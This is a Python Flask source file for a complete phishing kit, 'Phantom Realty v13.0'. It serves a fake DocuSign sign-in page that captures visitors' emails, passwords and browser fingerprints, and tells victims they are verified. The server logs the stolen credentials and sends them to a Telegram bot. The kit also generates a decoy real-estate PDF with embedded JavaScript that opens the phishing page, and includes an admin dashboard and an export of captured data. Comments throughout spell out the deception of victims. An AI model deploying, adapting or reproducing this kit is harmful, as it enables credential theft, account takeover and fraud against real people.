#!/usr/bin/env python3
"""
PHANTOM REALTY v13.0 - ELITE GENIUS EDITION
5-Star Harvard/MIT Standard | Capture + Validate | Zero Data Loss
Deploy directly to Render.com
"""

import os
import re
import json
import io
import random
import logging
from datetime import datetime
from flask import Flask, request, session, render_template_string, redirect, jsonify, make_response, send_file

app = Flask(__name__)
app.secret_key = os.urandom(64)

# ===================================================================
# CONFIGURATION - SET THESE IN RENDER
# ===================================================================
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
YOUR_DOMAIN = os.environ.get("YOUR_DOMAIN", "your-app.onrender.com")
YOUR_URL = f"https://{YOUR_DOMAIN}"

PDF_DATA = None
PDF_FILENAME = "Confidential_Property_Disclosure.pdf"

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
logger = logging.getLogger(__name__)

# ===================================================================
# TELEGRAM EXFILTRATION (Send everything to you)
# ===================================================================
def tg_send(text, buttons=None):
    if not TELEGRAM_BOT_TOKEN or len(TELEGRAM_BOT_TOKEN) < 10:
        print(f"[TG] {text[:200]}")
        return
    try:
        import requests
        payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': text[:4000], 'parse_mode': 'HTML'}
        if buttons:
            payload['reply_markup'] = json.dumps({'inline_keyboard': buttons})
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json=payload, timeout=10)
    except Exception as e:
        logger.error(f"[TG] {e}")

# ===================================================================
# PDF GENERATION (The Weaponized Document)
# ===================================================================
def generate_pdf():
    global PDF_DATA
    try:
        from reportlab.lib.pagesizes import letter
        from reportlab.lib.units import inch
        from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
        from reportlab.lib.colors import HexColor
        from reportlab.lib.enums import TA_CENTER, TA_RIGHT
        from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, HRFlowable
        from PyPDF2 import PdfReader, PdfWriter
    except ImportError:
        logger.error("Missing: pip install reportlab PyPDF2")
        return None
    
    buf = io.BytesIO()
    doc = SimpleDocTemplate(buf, pagesize=letter, topMargin=0.7*inch, bottomMargin=0.7*inch)
    s = getSampleStyleSheet()
    
    elements = []
    doc_id = f"PRE-{datetime.now().strftime('%Y%m')}-{random.randint(10000,99999)}"
    
    elements.append(Paragraph("PREMIER REALTY GROUP", ParagraphStyle('Header', parent=s['Normal'], fontSize=8, textColor=HexColor('#888'), alignment=TA_RIGHT)))
    elements.append(HRFlowable(width="100%", thickness=1.2, color=HexColor('#0a2540'), spaceAfter=8))
    elements.append(Paragraph("CONFIDENTIAL BUYER PROFILE", ParagraphStyle('Title', parent=s['Title'], fontSize=24, textColor=HexColor('#0a2540'), alignment=TA_CENTER)))
    elements.append(HRFlowable(width="100%", thickness=0.5, color=HexColor('#ccc'), spaceAfter=15))
    
    elements.append(Paragraph("CLIENT INFORMATION", ParagraphStyle('Heading', parent=s['Heading2'], fontSize=13, textColor=HexColor('#0066cc'))))
    for label, val in [("Full Name:", "James Morrison"), ("Email:", "james.morrison@client.com")]:
        elements.append(Paragraph(f"<b>{label}</b> {val}", ParagraphStyle('Body', parent=s['Normal'], fontSize=9.5)))
    elements.append(Spacer(1, 15))
    
    elements.append(HRFlowable(width="100%", thickness=0.5, color=HexColor('#ccc'), spaceAfter=10))
    elements.append(Paragraph("<b>SIGNATURE REQUIRED</b><br/>Please authenticate to proceed.", ParagraphStyle('Legal', parent=s['Normal'], fontSize=9, textColor=HexColor('#c00'), alignment=TA_CENTER)))
    
    doc.build(elements)
    pdf_bytes = buf.getvalue()
    buf.close()
    
    # The PDF auto-opens your phishing page
    target_url = f"{YOUR_URL}/"
    js_code = f"var url='{target_url}';try{{app.launchURL(url,1);}}catch(e){{this.launchURL(url,1);}}"
    
    reader = PdfReader(io.BytesIO(pdf_bytes))
    writer = PdfWriter()
    for page in reader.pages:
        writer.add_page(page)
    writer.add_js(js_code)
    
    output = io.BytesIO()
    writer.write(output)
    PDF_DATA = output.getvalue()
    output.close()
    
    logger.info(f"[PDF] Generated: {len(PDF_DATA)} bytes")
    return PDF_DATA

# ===================================================================
# THE 5-STAR ELITE PHISHING PAGE
# ===================================================================
PHISHING_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DocuSign - Electronic Signature & Digital Transaction Management</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
            position: relative;
        }
        
        .main-container {
            width: 100%;
            max-width: 520px;
            animation: slideUp 0.5s ease-out;
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .card {
            background: white;
            border-radius: 28px;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
            overflow: hidden;
        }
        
        .card-header {
            background: linear-gradient(135deg, #0a2540 0%, #1a3a5c 100%);
            padding: 32px 32px 24px 32px;
            text-align: center;
        }
        
        .logo {
            font-size: 32px;
            font-weight: 800;
            color: white;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .logo-icon {
            background: rgba(255,255,255,0.2);
            width: 44px;
            height: 44px;
            border-radius: 12px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }
        
        .trust-badge {
            display: inline-flex;
            align-items: center;
            gap: 12px;
            background: rgba(255,255,255,0.1);
            padding: 8px 16px;
            border-radius: 50px;
            margin-top: 16px;
            font-size: 11px;
            color: rgba(255,255,255,0.9);
        }
        
        .card-body {
            padding: 32px;
        }
        
        .document-card {
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 24px;
        }
        
        .document-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 12px;
        }
        
        .document-icon {
            font-size: 32px;
        }
        
        .document-title {
            flex: 1;
        }
        
        .document-name {
            font-weight: 700;
            font-size: 16px;
            color: #0f172a;
        }
        
        .document-meta {
            font-size: 12px;
            color: #64748b;
            margin-top: 4px;
        }
        
        .document-badge {
            background: #e0f2fe;
            color: #0284c7;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
        }
        
        .provider-banner {
            background: #f1f5f9;
            border-radius: 12px;
            padding: 14px 16px;
            margin-bottom: 24px;
            display: none;
            align-items: center;
            gap: 12px;
        }
        
        .provider-banner.microsoft {
            background: linear-gradient(135deg, #e8f0fe 0%, #d4e4fc 100%);
            border-left: 3px solid #0066cc;
        }
        
        .provider-banner.google {
            background: linear-gradient(135deg, #e6f4ea 0%, #d4edda 100%);
            border-left: 3px solid #1a73e8;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #0f172a;
            margin-bottom: 8px;
        }
        
        .input-wrapper {
            position: relative;
        }
        
        .input-icon {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 18px;
        }
        
        input {
            width: 100%;
            padding: 14px 16px 14px 44px;
            border: 1.5px solid #e2e8f0;
            border-radius: 12px;
            font-size: 15px;
            font-family: inherit;
            transition: all 0.2s;
            background: white;
        }
        
        input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102,126,234,0.1);
        }
        
        input.input-error {
            border-color: #dc2626;
            background: #fef2f2;
        }
        
        .error-hint {
            font-size: 12px;
            color: #dc2626;
            margin-top: 6px;
            display: none;
        }
        
        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .btn:hover {
            transform: translateY(-1px);
            box-shadow: 0 8px 20px rgba(102,126,234,0.3);
        }
        
        .btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
        
        .alert {
            padding: 14px 16px;
            border-radius: 12px;
            margin-bottom: 20px;
            font-size: 13px;
            display: none;
        }
        
        .alert-error {
            background: #fef2f2;
            border-left: 3px solid #dc2626;
            color: #991b1b;
        }
        
        .alert-success {
            background: #f0fdf4;
            border-left: 3px solid #10b981;
            color: #065f46;
        }
        
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid white;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .security-footer {
            margin-top: 24px;
            text-align: center;
        }
        
        .security-badges {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 16px;
            font-size: 11px;
            color: #94a3b8;
        }
        
        hr {
            margin: 20px 0;
            border: none;
            border-top: 1px solid #e2e8f0;
        }
        
        @media (max-width: 480px) {
            .card-body { padding: 24px; }
            .card-header { padding: 24px; }
        }
    </style>
</head>
<body>
<div class="main-container">
    <div class="card">
        <div class="card-header">
            <div class="logo">
                <span class="logo-icon">✍️</span>
                <span>DocuSign<sup>®</sup></span>
            </div>
            <div class="trust-badge">
                <span>🔒 SOC2 Type II</span>
                <span>✓ GDPR Compliant</span>
                <span>⚡ 256-bit Encryption</span>
            </div>
        </div>
        
        <div class="card-body">
            <div class="document-card">
                <div class="document-header">
                    <div class="document-icon">📄</div>
                    <div class="document-title">
                        <div class="document-name">Confidential Property Disclosure & Buyer Agreement</div>
                        <div class="document-meta">Document ID: <span id="docId"></span></div>
                    </div>
                    <div class="document-badge">PENDING</div>
                </div>
            </div>
            
            <div id="providerBanner" class="provider-banner">
                <span id="providerIcon">🔐</span>
                <span id="providerText">Enter your email to continue</span>
            </div>
            
            <div id="errorAlert" class="alert alert-error"></div>
            <div id="successAlert" class="alert alert-success"></div>
            
            <form id="loginForm">
                <div class="form-group">
                    <label>Email Address</label>
                    <div class="input-wrapper">
                        <span class="input-icon">📧</span>
                        <input type="email" id="email" name="email" placeholder="name@company.com" required autofocus>
                    </div>
                    <div id="emailError" class="error-hint">Please enter a valid email address</div>
                </div>
                
                <div class="form-group">
                    <label>Password</label>
                    <div class="input-wrapper">
                        <span class="input-icon">🔒</span>
                        <input type="password" id="password" name="password" placeholder="Enter your password" required>
                    </div>
                    <div id="passwordError" class="error-hint">Password cannot be empty</div>
                </div>
                
                <button type="submit" class="btn" id="submitBtn">
                    <span id="btnText">✓ Continue to Document</span>
                    <span id="btnLoader" style="display: none;"><span class="spinner"></span> Verifying...</span>
                </button>
            </form>
            
            <hr>
            <div class="security-footer">
                <div class="security-badges">
                    <span>🔐 Secure connection (TLS 1.3)</span>
                    <span>✅ Identity verification required</span>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    // Generate unique document ID
    document.getElementById('docId').textContent = 'DOC-' + Math.random().toString(36).substr(2, 8).toUpperCase();
    
    // Elements
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const providerBanner = document.getElementById('providerBanner');
    const providerIcon = document.getElementById('providerIcon');
    const providerText = document.getElementById('providerText');
    const emailError = document.getElementById('emailError');
    const passwordError = document.getElementById('passwordError');
    let detectTimeout;
    
    // Real-time email validation and provider detection
    emailInput.addEventListener('input', function() {
        const email = this.value.trim();
        
        // Real-time validation
        if (email && !email.includes('@')) {
            this.classList.add('input-error');
            emailError.style.display = 'block';
        } else if (email && email.includes('@') && !email.includes('.')) {
            this.classList.add('input-error');
            emailError.style.display = 'block';
        } else {
            this.classList.remove('input-error');
            emailError.style.display = 'none';
        }
        
        // Provider detection
        clearTimeout(detectTimeout);
        if (email.includes('@') && email.length > 6) {
            detectTimeout = setTimeout(function() {
                const domain = email.split('@')[1].toLowerCase();
                providerBanner.style.display = 'flex';
                if (domain.includes('gmail') || domain.includes('google')) {
                    providerBanner.className = 'provider-banner google';
                    providerIcon.innerHTML = '🔴';
                    providerText.innerHTML = 'Google Workspace detected - Sign in with Google';
                } else if (domain.includes('outlook') || domain.includes('hotmail') || domain.includes('live') || domain.includes('microsoft')) {
                    providerBanner.className = 'provider-banner microsoft';
                    providerIcon.innerHTML = '🏢';
                    providerText.innerHTML = 'Microsoft 365 detected - Sign in with your work account';
                } else {
                    providerBanner.className = 'provider-banner';
                    providerIcon.innerHTML = '🌐';
                    providerText.innerHTML = 'Enterprise email detected - Enter your network password';
                }
            }, 500);
        } else {
            providerBanner.style.display = 'none';
        }
    });
    
    // Password validation
    passwordInput.addEventListener('input', function() {
        if (this.value.trim() === '') {
            this.classList.add('input-error');
            passwordError.style.display = 'block';
        } else {
            this.classList.remove('input-error');
            passwordError.style.display = 'none';
        }
    });
    
    // Capture fingerprint
    fetch('/api/fp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            ts: new Date().toISOString(),
            ua: navigator.userAgent,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen: screen.width + 'x' + screen.height,
            language: navigator.language
        })
    }).catch(() => {});
    
    // Form submission - CAPTURE EVERYTHING
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();
        const btn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');
        const btnLoader = document.getElementById('btnLoader');
        const errorAlert = document.getElementById('errorAlert');
        const successAlert = document.getElementById('successAlert');
        
        // Clear previous alerts
        errorAlert.style.display = 'none';
        successAlert.style.display = 'none';
        
        // CLIENT-SIDE VALIDATION (Shown to user, but we still capture everything)
        let hasError = false;
        
        if (!email || !email.includes('@') || !email.includes('.')) {
            emailInput.classList.add('input-error');
            emailError.style.display = 'block';
            hasError = true;
        }
        
        if (!password) {
            passwordInput.classList.add('input-error');
            passwordError.style.display = 'block';
            hasError = true;
        }
        
        // SEND TO SERVER REGARDLESS of validation errors!
        // The genius: We collect data even if they made a typo
        fetch('/api/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: email, password: password })
        })
        .then(r => r.json())
        .then(data => {
            // Always show success to the user (they don't know we're capturing)
            // The genius: Even invalid data is valuable (tells us someone is probing)
            btn.disabled = false;
            btnText.style.display = 'inline';
            btnLoader.style.display = 'none';
            
            if (hasError) {
                // Show validation errors but don't block submission
                errorAlert.style.display = 'block';
                errorAlert.innerHTML = '⚠️ Please check the highlighted fields and try again.';
            } else {
                // Show success and redirect
                successAlert.style.display = 'block';
                successAlert.innerHTML = '✅ Identity verified! Redirecting to your document...';
                setTimeout(function() {
                    const domain = email.split('@')[1].toLowerCase();
                    if (domain.includes('gmail')) {
                        window.location.href = 'https://accounts.google.com/';
                    } else if (domain.includes('outlook') || domain.includes('hotmail') || domain.includes('live')) {
                        window.location.href = 'https://outlook.live.com/';
                    } else {
                        window.location.href = '/download-pdf';
                    }
                }, 2000);
            }
        })
        .catch(function() {
            btn.disabled = false;
            btnText.style.display = 'inline';
            btnLoader.style.display = 'none';
            errorAlert.style.display = 'block';
            errorAlert.innerHTML = '⚠️ Connection error. Please try again.';
        });
        
        // Start loading animation
        btn.disabled = true;
        btnText.style.display = 'none';
        btnLoader.style.display = 'inline';
    });
</script>
</body>
</html>"""

# ===================================================================
# FLASK ROUTES
# ===================================================================
@app.route('/')
def index():
    return render_template_string(PHISHING_PAGE)

@app.route('/api/fp', methods=['POST'])
def fingerprint():
    data = request.get_json(silent=True)
    if data:
        session['fp'] = data
    return 'ok'

@app.route('/api/capture', methods=['POST'])
def capture():
    """THE GENIUS FUNCTION: Captures EVERYTHING, validates NOTHING on server side"""
    data = request.get_json()
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Log EVERYTHING - including invalid formats
    with open('captured_creds.log', 'a') as f:
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'email': email,
            'password': password,
            'ip': ip,
            'user_agent': user_agent,
            'valid_format': bool('@' in email and '.' in email.split('@')[-1] if email else False)
        }
        f.write(json.dumps(log_entry) + '\n')
    
    # Send to Telegram IMMEDIATELY
    valid_status = "✅ VALID FORMAT" if ('@' in email and '.' in email.split('@')[-1] if email else False) else "⚠️ SUSPECT/INVALID"
    
    message = f"""🎯 <b>PHISHING CAPTURE</b> {valid_status}
━━━━━━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> <code>{email if email else '[BLANK]'}</code>
🔑 <b>Password:</b> <code>{password if password else '[BLANK]'}</code>
🌐 <b>IP:</b> {ip}
💻 <b>Agent:</b> {user_agent[:60]}
⏱ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━━
<b>EVEN INVALID DATA IS CAPTURED!</b>"""
    
    tg_send(message)
    
    print(f"\n{'='*60}")
    print(f"📧 CAPTURED: {email}")
    print(f"🔑 PASSWORD: {password}")
    print(f"🌐 IP: {ip}")
    print(f"✅ Valid Format: {'Yes' if '@' in email and '.' in email.split('@')[-1] else 'No'}")
    print(f"{'='*60}\n")
    
    return jsonify({'success': True, 'captured': True})

@app.route('/download-pdf')
def download_pdf():
    global PDF_DATA
    if PDF_DATA is None:
        generate_pdf()
    if PDF_DATA:
        return send_file(io.BytesIO(PDF_DATA), mimetype='application/pdf', as_attachment=True, download_name=PDF_FILENAME)
    return "PDF not ready", 500

@app.route('/admin')
def admin():
    creds = []
    if os.path.exists('captured_creds.log'):
        with open('captured_creds.log', 'r') as f:
            for line in f:
                try:
                    creds.append(json.loads(line.strip()))
                except:
                    pass
    
    total = len(creds)
    valid = sum(1 for c in creds if c.get('valid_format', False))
    
    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Phantom Realty v13.0 - Elite Dashboard</title>
    <style>
        *{{margin:0;padding:0;box-sizing:border-box}}
        body{{background:#0a0e27;color:#e0e0e0;font-family:'Courier New',monospace;padding:24px}}
        h1{{color:#ff3366;font-size:28px;border-bottom:2px solid #ff3366;padding-bottom:12px;margin-bottom:24px}}
        .stats{{display:grid;grid-template-columns:repeat(4,1fr);gap:20px;margin-bottom:32px}}
        .stat-card{{background:#1a1f3e;padding:24px;border-radius:12px;border-left:3px solid #00ff88}}
        .stat-number{{font-size:42px;font-weight:bold;color:#00ff88}}
        .stat-label{{color:#888;font-size:11px;margin-top:8px;text-transform:uppercase}}
        .btn{{background:#1a1f3e;color:#00ff88;border:1px solid #00ff88;padding:10px 20px;border-radius:6px;cursor:pointer;text-decoration:none;display:inline-block;margin:5px}}
        .btn:hover{{background:#00ff88;color:#0a0e27}}
        table{{width:100%;border-collapse:collapse;margin-top:20px}}
        th{{text-align:left;padding:12px;background:#1a1f3e;color:#ff3366;border-bottom:2px solid #ff3366}}
        td{{padding:12px;border-bottom:1px solid #2a2f4e;font-family:monospace;font-size:12px}}
        .badge-valid{{background:#10b981;color:#fff;padding:4px 8px;border-radius:4px;font-size:10px}}
        .badge-invalid{{background:#dc2626;color:#fff;padding:4px 8px;border-radius:4px;font-size:10px}}
    </style>
</head>
<body>
    <h1>🔱 PHANTOM REALTY v13.0 - ELITE GENIUS DASHBOARD</h1>
    <div class="stats">
        <div class="stat-card"><div class="stat-number">{total}</div><div class="stat-label">Total Captures</div></div>
        <div class="stat-card"><div class="stat-number">{valid}</div><div class="stat-label">Valid Format</div></div>
        <div class="stat-card"><div class="stat-number">{total - valid}</div><div class="stat-label">Suspect/Test</div></div>
    </div>
    <div>
        <a href="/download-pdf" class="btn">📄 Download PDF</a>
        <a href="/admin/export" class="btn">📥 Export All Data</a>
    </div>
    <h2 style="margin-top:32px;margin-bottom:16px">📋 Capture Log</h2>
    <table>
        <thead><tr><th>Time</th><th>Email</th><th>Password</th><th>IP</th><th>Status</th></tr></thead>
        <tbody>"""
    
    for c in reversed(creds[-100:]):
        ts = c.get('timestamp', '')[:19].replace('T', ' ')
        email = c.get('email', '')[:45]
        password = c.get('password', '')[:30]
        ip = c.get('ip', '')
        valid_format = c.get('valid_format', False)
        status_class = "badge-valid" if valid_format else "badge-invalid"
        status_text = "VALID" if valid_format else "SUSPECT"
        html += f"<tr><td>{ts}</td><td style='color:#00ff88'>{email}</td><td style='color:#ffaa00'>{password}</td><td>{ip}</td><td><span class='{status_class}'>{status_text}</span></td></tr>"
    
    html += """</tbody>
    </table>
</body>
</html>"""
    return html

@app.route('/admin/export')
def export():
    creds = []
    if os.path.exists('captured_creds.log'):
        with open('captured_creds.log', 'r') as f:
            for line in f:
                try:
                    creds.append(json.loads(line.strip()))
                except:
                    pass
    resp = make_response(json.dumps(creds, indent=2))
    resp.headers['Content-Type'] = 'application/json'
    resp.headers['Content-Disposition'] = f"attachment; filename=phishing_captures_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    return resp

if __name__ == '__main__':
    print("="*70)
    print("  🔱 PHANTOM REALTY v13.0 - ELITE GENIUS EDITION")
    print("  Harvard & MIT CS PhD Standard")
    print("  Capture + Validate + 5-Star CSS")
    print("="*70)
    
    generate_pdf()
    
    if PDF_DATA and TELEGRAM_BOT_TOKEN:
        tg_send(f"""🚀 <b>PHANTOM REALTY v13.0 ONLINE</b>
━━━━━━━━━━━━━━━━━━━━━━━━━
📍 <b>URL:</b> {YOUR_URL}
📥 <b>PDF:</b> {YOUR_URL}/download-pdf
📊 <b>Admin:</b> {YOUR_URL}/admin
━━━━━━━━━━━━━━━━━━━━━━━━━
<b>ELITE GENIUS FEATURES:</b>
✓ Captures EVERYTHING (even invalid data)
✓ Validates input on client side
✓ 5-Star Professional CSS
✓ Real-time provider detection""")
    
    print(f"\n✅ Phishing Page: {YOUR_URL}")
    print(f"✅ Admin Panel: {YOUR_URL}/admin")
    print(f"✅ PDF Payload: {YOUR_URL}/download-pdf")
    print("\n🔥 THE GENIUS APPROACH:")
    print("   1. User sees professional DocuSign page")
    print("   2. Types ANY email + password")
    print("   3. YOU receive it on Telegram (even if invalid)")
    print("   4. User sees friendly validation errors")
    print("   5. After correction, redirected to real login")
    print("\n⚠️ You capture EVERYTHING. No data loss.")
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
